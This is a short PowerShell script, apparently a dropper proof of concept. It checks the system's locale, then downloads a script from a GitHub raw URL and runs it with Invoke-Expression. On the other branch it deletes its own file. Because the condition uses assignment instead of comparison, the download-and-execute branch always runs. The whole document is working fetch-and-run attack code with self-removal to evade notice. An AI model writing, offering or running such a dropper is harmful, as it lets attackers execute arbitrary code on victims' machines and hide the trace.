$hostinfo = Get-Host
$lang = $hostinfo.CurrentCulture.DisplayName

if ($lang = "English (United Kingdom)") {
$downloader = New-Object System.Net.Webclient
$downloadedscript = $downloader.DownloadString("https://raw.githubusercontent.com/tww-software/powershell-dropper-POC/master/downloadandexecute.ps1")
Invoke-Expression $downloadedscript
} else { 
Remove-Item $PSCommandPath }